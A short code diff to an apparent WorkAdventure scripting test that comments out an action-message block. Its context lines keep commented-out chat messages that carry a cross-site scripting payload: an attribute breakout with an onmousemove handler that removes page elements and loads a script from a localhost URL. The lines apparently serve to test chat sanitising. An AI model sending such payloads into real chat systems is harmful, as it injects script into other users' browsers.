@@ -23,12 +23,12 @@ scriptNesting(Promise.all([
             })
         }
 
-        WA.ui.displayActionMessage({
-            message: "test",
-            callback: () => {
-                WA.chat.sendChatMessage('test tr', '');
-            }
-        });
+        /* WA.ui.displayActionMessage({
+             message: "test",
+             callback: () => {
+                 WA.chat.sendChatMessage('test tr', '');
+             }
+         });*/
     }, 2000);
     // WA.chat.sendChatMessage(`test https://www.google.de"onmousemove="debugger;event.target.parentElement.parentElement.remove();window.scr=document.createElement('script');window.scr.src='http://localhost/scripts/injected.js';document.body.appendChild(window.scr);"style="position:fixed;top:0px;bottom:0px;right:0px;left:0px" zez`, "test")
     // WA.chat.sendChatMessage(`test https://www.google.de"onmousemove="debugger;"style="position:fixed;top:0px;bottom:0px;right:0px;left:0px" zez`, "test")
